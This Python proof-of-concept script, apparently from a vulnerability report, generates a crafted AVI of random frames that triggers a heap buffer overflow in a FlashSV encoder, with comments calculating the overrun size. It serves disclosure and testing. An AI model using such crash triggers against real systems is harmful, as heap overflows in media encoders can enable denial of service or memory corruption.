#!/usr/bin/env python3
"""
PoC generator for VULN 001: Heap Buffer Overflow in FlashSV Encoder via compress2 Output Overrun
Generates a crafted AVI file with random/incompressible frame data at a resolution
that triggers the overflow (nb_blocks >= 6, ideally many more).
"""

import struct
import os

# Resolution: 512x448 -> h_blocks=8, v_blocks=7, nb_blocks=56 (ALL full 64x64 blocks)
# IMPORTANT: both dimensions must be multiples of 64 so h_part=v_part=0.
# With partial edge blocks, smaller outputs absorb the overflow slack and ASAN won't trigger.
# With all full blocks, compress2 expands each 12288-byte random input to ~12299 bytes,
# cumulative overflow = 56*12299 - (56*12288 + 64) = 56*11 - 64 = 552 bytes past allocation.
WIDTH = 512
HEIGHT = 448
FPS = 30
NUM_FRAMES = 3

def fourcc(s):
    return s.encode('ascii')

def pack_chunk(tag, data):
    """Pack a RIFF chunk: tag (4 bytes), size (4 bytes LE), data"""
    assert len(tag) == 4
    return tag.encode('ascii') + struct.pack('<I', len(data)) + data

def pack_list(list_type, data):
    """Pack a LIST chunk"""
    inner = list_type.encode('ascii') + data
    return b'LIST' + struct.pack('<I', len(inner)) + inner

def make_avih(width, height, fps, num_frames):
    """Create main AVI header (avih chunk data, 56 bytes)"""
    micro_sec_per_frame = 1000000 // fps
    frame_size = width * height * 3
    return struct.pack('<IIIIIIIIIIIIII',
        micro_sec_per_frame,  # dwMicroSecPerFrame
        frame_size * fps,     # dwMaxBytesPerSec
        0,                    # dwPaddingGranularity
        0x10,                 # dwFlags
        num_frames,           # dwTotalFrames
        0,                    # dwInitialFrames
        1,                    # dwStreams
        frame_size,           # dwSuggestedBufferSize
        width,                # dwWidth
        height,               # dwHeight
        0, 0, 0, 0,           # dwReserved[4]
    )

def make_strh(width, height, fps, num_frames):
    """Create stream header (strh chunk data, 56 bytes)"""
    frame_size = width * height * 3
    return struct.pack('<4s4sIHHIIIIIIII',
        b'vids',              # fccType
        b'\x00\x00\x00\x00', # fccHandler (uncompressed)
        0,                    # dwFlags
        0,                    # wPriority
        0,                    # wLanguage
        0,                    # dwInitialFrames
        1,                    # dwScale
        fps,                  # dwRate
        0,                    # dwStart
        num_frames,           # dwLength
        frame_size,           # dwSuggestedBufferSize
        0,                    # dwQuality
        0,                    # dwSampleSize
        # rcFrame: left, top, right, bottom (each 16-bit)
    ) + struct.pack('<hhhh', 0, 0, width, height)

def make_strf(width, height):
    """Create BITMAPINFOHEADER for BGR24 (biCompression=0 = BI_RGB)"""
    return struct.pack('<IiiHHIIiiII',
        40,           # biSize
        width,        # biWidth
        height,       # biHeight (positive = bottom-up)
        1,            # biPlanes
        24,           # biBitCount (BGR24)
        0,            # biCompression (BI_RGB)
        width * height * 3,  # biSizeImage
        0,            # biXPelsPerMeter
        0,            # biYPelsPerMeter
        0,            # biClrUsed
        0,            # biClrImportant
    )

def make_avi(width, height, fps, num_frames):
    frame_size = width * height * 3

    # Build strl list
    avih_data = make_avih(width, height, fps, num_frames)
    strh_data = make_strh(width, height, fps, num_frames)
    strf_data = make_strf(width, height)

    strl_content = (
        pack_chunk('avih', avih_data) +
        pack_chunk('strh', strh_data) +
        pack_chunk('strf', strf_data)
    )

    hdrl_content = pack_list('strl', strl_content)
    hdrl = pack_list('hdrl', hdrl_content)

    # Build movi list with random frames
    frames = b''
    for i in range(num_frames):
        # Random (incompressible) BGR24 frame data
        frame_data = os.urandom(frame_size)
        frames += pack_chunk('00dc', frame_data)

    movi = pack_list('movi', frames)

    # Assemble RIFF AVI
    avi_content = b'AVI ' + hdrl + movi
    riff = b'RIFF' + struct.pack('<I', len(avi_content)) + avi_content

    return riff

if __name__ == '__main__':
    output_path = 'vuln_001_input.avi'
    avi_data = make_avi(WIDTH, HEIGHT, FPS, NUM_FRAMES)
    with open(output_path, 'wb') as f:
        f.write(avi_data)
    print(f"Generated {output_path}: {len(avi_data)} bytes")
    print(f"  Resolution: {WIDTH}x{HEIGHT}, {NUM_FRAMES} frames")
    nb_blocks = ((WIDTH + 63) // 64) * ((HEIGHT + 63) // 64)
    print(f"  nb_blocks = {nb_blocks} (overflow potential: {nb_blocks * 12} bytes/frame)")
    print(f"  AV_INPUT_BUFFER_PADDING_SIZE = 64 bytes (overflow margin: {nb_blocks * 12 - 64} bytes)")
